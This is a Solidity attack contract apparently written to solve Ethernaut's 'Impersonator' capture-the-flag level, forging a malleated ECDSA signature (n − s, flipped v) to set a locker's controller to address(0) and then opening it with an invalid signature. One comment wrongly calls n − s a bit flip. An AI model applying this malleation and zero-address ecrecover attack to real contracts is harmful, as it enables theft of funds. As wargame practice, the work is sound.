pragma solidity ^0.8.0;
//SPDX-License-Identifier: MIT
import {Impersonator, ECLocker} from "../levels/Impersonator.sol";

// Attack contract for the Impersonator level (lvl 32) of Ethernaut. 
// The goal is to allow anyone to open the locker without being the controller.
// the key is to retrieve the original (v, r, s) signature values used to set the controller,
// then malleate them to create a new valid signature that sets the controller to address(0).
// this lets anyone submit an invalid signature to open the locker as ecrecover will return address(0) for invalid signatures.

contract ImpersonaterAttack {
    Impersonator public target;

    constructor(address _target) {
        target = Impersonator(_target);
    }

    function attack(uint8 v, bytes32 r, bytes32 s) public {
        (uint malleatedS, uint8 malleatedV) = malleate(uint(s), v);

        ECLocker locker = ECLocker(target.lockers(0));

        locker.changeController(malleatedV, r, bytes32(malleatedS), address(0));

        require(locker.controller() == address(0), "Controller change failed");

        malleatedV = 17;

        locker.open(malleatedV, r, bytes32(malleatedS));
        
    }
    function malleate(uint _s, uint8 _v) public pure returns (uint, uint8) {
        // Flip the highest bit of s
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        uint malleatedS = n - _s;
        // Flip v between 27 and 28
        uint8 malleatedV = _v == 27 ? 28 : 27;
        return (malleatedS, malleatedV);
    }
}
